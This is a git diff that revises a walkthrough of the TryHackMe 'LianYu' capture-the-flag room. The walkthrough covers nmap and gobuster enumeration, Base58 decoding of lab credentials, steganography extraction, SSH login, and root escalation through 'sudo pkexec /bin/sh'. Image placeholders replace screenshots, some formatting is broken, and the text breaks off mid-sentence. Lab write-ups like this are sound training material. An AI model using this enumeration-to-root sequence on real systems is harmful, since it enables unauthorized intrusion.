@@ -1,53 +1,195 @@
 # W6-TryHackMe-LianYu-Walkthrough
----
-
 ## **Summary**
 
-| Phase                   | Action                          | Outcome                                  |
-|------------------------|----------------------------------|------------------------------------------|
-| Reconnaissance         | Nmap scan                        | Identified FTP, SSH, HTTP, RPC           |
-| Scanning & Enumeration | Gobuster, web analysis           | Found `/island`, `/2100`, `.ticket` file |
-| Gaining Access         | FTP login                        | Access to image files                    |
-| Exploitation           | Steganography + decoding         | Retrieved SSH credentials                |
-| Post-Exploitation      | SSH access                       | Retrieved user flag                      |
-| Privilege Escalation   | `pkexec` exploitation            | Root access obtained                     |
+| Phase                     | Action                                  | Outcome                                      |
+|--------------------------|-----------------------------------------|----------------------------------------------|
+| Reconnaissance           | `Nmap` scan                             | Identified open ports (FTP, SSH, HTTP)       |
+| Scanning & Enumeration   | `Gobuster`, source code review          | Found `/island` and `/2100`                  |
+| Scanning & Enumeration   | Gobuster with `.ticket` extension       | Discovered `/green_arrow.ticket`             |
+| Gaining Access           | Base58 decoding                         | Retrieved FTP credentials                    |
+| Exploitation             | FTP login + file extraction             | Discovered hidden files & images             |
+| Post-Exploitation        | File analysis + steganography           | Extracted SSH credentials                    |
+| Privilege Escalation     | `pkexec` via GTFOBins                   | Root access obtained                         |
 
 ---
 
 ## **1. Reconnaissance (Information Gathering)**
 
-**Objective:** Identify open ports and services.
+**Objective:** Identify target surface and exposed services.
+
+Always start with an Nmap scan to discover open ports and services.
 
 ```bash
-nmap -sC -sV -Pn -T4 -oN nmap/lianyu <TARGET_IP>
-<img width="940" height="564" alt="image" src="https://github.com/user-attachments/assets/4a2c4a96-2e65-4f06-b3bf-d8831d16a4f1" />
+nmap -sC -sV -Pn -T4 10.48.140.128
+<img src="ADD_NMAP_SCREENSHOT" />
+Findings:
+Service	Port	What can be done (commands / next step)	Findings
+FTP	21	ftp 10.48.140.128	Requires credentials
+SSH	22	ssh user@10.48.140.128	Possible remote login
+HTTP	80	Open in browser	Main entry point
+RPC	111	Enumeration possible	Low priority
+Explanation:
 
----
+The scan shows multiple services, but HTTP (port 80) is the best starting point because web applications often expose hidden directories or sensitive data.
 
-## **2. Scanning & Enumeration**
+2. Scanning & Enumeration
 
-**Objective:** Extract deeper information from identified services.
+Objective: Extract deeper information from identified services.
 
-After identifying HTTP service on port 80 from the Nmap scan, I opened the web application in the browser:
-
-```bash
-http://<TARGET_IP>
-<img width="940" height="686" alt="image" src="https://github.com/user-attachments/assets/7a8b6726-4e2a-4be2-9be8-793db07ef8c4" />
-
-
-The webpage displayed **Purgatory**, which suggests that there may be hidden content or directories that are not directly visible.
-
----
-
-Next, I performed directory brute-forcing using Gobuster to discover hidden directories:
-
-```bash
-gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-<img width="940" height="306" alt="image" src="https://github.com/user-attachments/assets/4b8804e1-0bed-4b16-aa93-ec976a207888" />
-
-From the result, I found a directory:
-```bash
+Web Enumeration
+gobuster dir -u http://10.48.140.128 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<img src="ADD_GOBUSTER_SCREENSHOT" />
+Discovered:
 /island
+/island
+http://10.48.140.128/island
+<img src="ADD_ISLAND_SCREENSHOT" />
+Finding:
+
+Hidden text (highlighted):
+
+vigilante
+Explanation:
+
+This keyword is likely used later as a username or credential.
+
+Further Enumeration
+gobuster dir -u http://10.48.140.128/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<img src="ADD_2100_GOBUSTER_SCREENSHOT" />
+Discovered:
+/2100
+/island/2100
+http://10.48.140.128/island/2100
+<img src="ADD_2100_PAGE_SCREENSHOT" />
+
+Check source code:
+
+<!-- you can avail your ticket here but how? -->
+Explanation:
+
+This hint suggests a hidden file, likely with a specific extension.
+
+Search for .ticket files
+gobuster dir -u http://10.48.140.128/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
+<img src="ADD_TICKET_SCREENSHOT" />
+Discovered:
+/green_arrow.ticket
+3. Gaining Access (Exploitation)
+
+Objective: Decode hidden credentials.
+
+Ticket Content:
+RTy8yhBQdscX
+Explanation:
+
+The string is encoded. After testing different formats, it is identified as Base58 encoding.
+
+Decoded result:
+
+!#th3h00d
+
+➡️ This is the FTP password
+
+FTP Login
+ftp 10.48.140.128
+
+Credentials:
+
+Username: vigilante
+Password: !#th3h00d
+<img src="ADD_FTP_SCREENSHOT" />
+4. Maintaining Access (Post-Exploitation)
+
+Objective: Extract and analyze files from FTP.
+
+Download Files
+mget *
+ls -la
+<img src="ADD_FTP_FILES_SCREENSHOT" />
+Files Found:
+Leave_me_alone.png
+Queen's_Gambit.png
+aa.jpg
+.other_user
+Hidden File Analysis
+cat .other_user
+<img src="ADD_OTHER_USER_SCREENSHOT" />
+Finding:
+Slade Wilson
+Explanation:
+
+This is likely the SSH username.
+
+5. Exploitation (File Analysis & Steganography)
+Step 1: Fix Corrupted PNG
+exiftool Leave_me_alone.png
+
+Error:
+
+File format error
+Explanation:
+
+The PNG file has an incorrect file signature, causing it to fail.
+
+Fix using Hexeditor
+hexeditor Leave_me_alone.png
+
+Correct header:
+
+89 50 4E 47 0D 0A 1A 0A
+<img src="ADD_HEXEDITOR_SCREENSHOT" />
+Result
+<img src="ADD_FIXED_IMAGE_SCREENSHOT" />
+Finding:
+password
+Step 2: Extract Hidden Data
+steghide extract -sf aa.jpg
+
+Password:
+
+password
+<img src="ADD_STEGHIDE_SCREENSHOT" />
+Output:
+ss.zip
+unzip ss.zip
+<img src="ADD_UNZIP_SCREENSHOT" />
+Extracted Files:
+passwd.txt
+shado
+Inspect Credentials
+cat shado
+<img src="ADD_SHADO_SCREENSHOT" />
+Result:
+M3tahuman
+
+➡️ SSH Password
+
+6. Gaining Shell Access
+ssh slade@10.48.140.128
+
+Credentials:
+
+Username: slade
+Password: M3tahuman
+<img src="ADD_SSH_SCREENSHOT" />
+User Flag
+cat user.txt
+<img src="ADD_USER_FLAG_SCREENSHOT" />
+7. Privilege Escalation & Lateral Movement
+Check sudo permissions
+sudo -l
+<img src="ADD_SUDO_SCREENSHOT" />
+Finding:
+(root) /usr/bin/pkexec
+Exploit using GTFOBins
+sudo pkexec /bin/sh
+<img src="ADD_ROOT_SCREENSHOT" />
+Verify Root
+whoami
+root
+Root Flag
+cat root.txt
+<img src="ADD_ROOT_FLAG_SCREENSHOT" />
 
 After that, I navigated to:
 
